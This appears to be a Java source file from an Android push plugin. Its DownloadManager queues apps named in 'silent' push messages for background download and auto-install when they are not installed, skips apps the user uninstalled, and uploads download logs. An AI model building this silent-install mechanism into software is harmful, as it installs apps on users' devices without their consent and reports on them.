package com.tiho.dlplugin.observer.download;

import java.util.List;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushMessageBean;
import com.tiho.dlplugin.dao.PushDataSource;
import com.tiho.dlplugin.log.LogUploadManager;
import com.tiho.dlplugin.task.uninstall.UnInstallList;
import com.tiho.dlplugin.util.PackageUtil;
import com.tiho.dlplugin.util.TimeUtil;

import android.content.Context;

public class DownloadManager {

	private DownloadList downloadList;

	private DownloadWorker worker;

	private PushDataSource dataSource;

	private Context c;

	private static DownloadManager instance;

	public synchronized static DownloadManager getInstance(Context c) {
		if (instance == null)
			instance = new DownloadManager(c);

		return instance;
	}

	private DownloadManager(Context c) {

		this.c = c;

		dataSource = PushDataSource.getInstance(c);

		try {

			List<PushMessageBean> list = dataSource.getSilentMessage();
			downloadList = new DownloadList();
			addToDownloadList(list);

			worker = new DownloadWorker(downloadList, this.c);
			worker.start();

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	

	/**
	 * 添加到下载列表中
	 * 
	 * @param list
	 */
	public void addToDownloadList(List<PushMessageBean> list) {

		for (PushMessageBean pushMessageBean : list) {

			if (UnInstallList.deleted(c, pushMessageBean.getPackName())) {
				//如果已经卸载过，就不进行下载
				LogManager.LogShow(pushMessageBean.getPackName() + "已经被卸载，不进行下载");
				LogUploadManager.getInstance(c).addDownloadLog(pushMessageBean.getPushId(), 2, pushMessageBean.getPackName(), TimeUtil.getNowTime(), TimeUtil.getNowTime(), 0, 0, 0, "ALREADY_UNINSTALLED", 2, "Y");

				//静默安装并且是未安装
			} else if ("Y".equalsIgnoreCase(pushMessageBean.getAutoInstall()) && !PackageUtil.isInstalled(pushMessageBean.getPackName(), c)) {
				
				downloadList.addToDownloadList(pushMessageBean);
				LogManager.LogShow(pushMessageBean.getPackName() + "添加到静默下载列表中");
			} else {
				//已安装
				LogUploadManager.getInstance(c).addDownloadLog(pushMessageBean.getPushId(), 2, pushMessageBean.getPackName(), TimeUtil.getNowTime(), TimeUtil.getNowTime(), 0, 0, 0,
						"DOWNLOAD_FAILED_ALREADY_INSTALLED", 2, "Y");
			}
		}
		
		downloadList.sort();

	}

	public void deleteDownload(PushMessageBean p) {
		downloadList.consumed(p);
	}

}
